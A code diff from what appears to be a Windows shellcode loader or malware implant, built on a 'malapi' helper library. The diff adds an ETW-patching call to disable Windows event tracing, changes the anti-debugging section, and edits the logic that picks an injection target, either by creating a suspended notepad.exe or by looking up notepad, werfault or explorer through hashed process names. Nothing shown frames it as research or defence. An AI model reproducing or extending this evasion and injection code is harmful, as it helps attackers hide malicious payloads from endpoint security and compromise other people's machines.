@@ -14,6 +14,10 @@ VOID entry(void)
 
 	// unsigned char shellcode[] = EncryptShellcode(CONFIG_PAYLOAD_SHELLCODE, CONFIG_ENCRYPT_KEY, sizeof(shellcode), sizeof(CONFIG_ENCRYPT_KEY));
 
+#pragma region Guard Rails
+
+#pragma endregion
+
 #pragma region Evasion
 
 #if SLEEP_ENABLED
@@ -21,13 +25,12 @@ VOID entry(void)
 #else
 #endif
 
-//#if ANTI_SANDBOX_ENABLED
-//#else
-//#endif
+		//#if ANTI_SANDBOX_ENABLED
+		//#else
+		//#endif
 
-#if ANTI_DEBUG_ENABLED
-	malapi::HideFromDebugger();
-#else
+#if PATCH_ENABLED
+	malapi::PatchEtw();
 #endif
 
 #pragma endregion
@@ -38,18 +41,17 @@ VOID entry(void)
 
 #pragma endregion
 
-#if CONFIG_CREATE_PROCESS
+#if CONFIG_CREATE_PROCESS == 1
 	LPCSTR file_path = "C:\\Windows\\System32\\notepad.exe";
 	process_handle = malapi::CreateSuspendedProcess((LPSTR)file_path);
 #else
 	constexpr ULONG targets[] = {
 		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"),
-		malapi::HashStringFowlerNollVoVariant1a("svchost.exe"),
-		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"),
 	};
 
-	pid = malapi::GetPidFromHashedList((DWORD*)targets, 1);
+	pid = malapi::GetPidFromHashedList((DWORD*)targets, sizeof(targets));
 
 	if (pid == NULL)
 	{
